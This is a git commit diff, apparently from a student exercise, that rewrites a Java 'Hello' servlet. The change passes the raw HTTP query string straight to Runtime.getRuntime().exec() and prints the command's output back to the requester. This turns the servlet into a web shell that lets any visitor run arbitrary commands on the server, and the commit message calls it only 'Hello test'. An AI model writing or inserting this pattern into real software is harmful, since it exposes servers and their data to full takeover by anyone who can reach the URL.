f6015711d6fac31475ea8ae22bb34a17f02ff1c7
alex <a.cealicov@gmail.com>
2017-02-01 15:23:02 +0000

    Hello test

--- Hello.java
+++ Hello.java
@@ -6,16 +6,44 @@ import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
 import java.io.IOException;
 import java.io.PrintWriter;
+import java.io.InputStream;
+
 
 public class Hello extends HttpServlet
 {
-    protected void doGet(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse) throws ServletException, IOException
+    protected void doGet (HttpServletRequest httpServletRequest,
+                          HttpServletResponse httpServletResponse)
+            throws ServletException,IOException
     {
         httpServletResponse.setContentType("text/plain");
         PrintWriter out = httpServletResponse.getWriter();
-        out.println("Hello CS2001 from Steve");
-	String x = httpServletRequest.getQueryString();
-	out.println(x);
+        out.print("test:");
+
+        String x = httpServletRequest.getQueryString();
+
+        try {
+            Process p = Runtime.getRuntime().exec(x);
+
+            InputStream is = p.getInputStream();
+            int c;
+            StringBuilder CommandResponse = new StringBuilder();
+
+            while ((c = is.read()) != -1)
+            {
+                CommandResponse.append((char)c);
+            }
+            out.println(CommandResponse);
+            is.close();
+        }
+
+
+        catch (Exception E)
+        {
+            E.printStackTrace();
+        }
+
+        out.print (x);
         out.close();
     }
 }
+
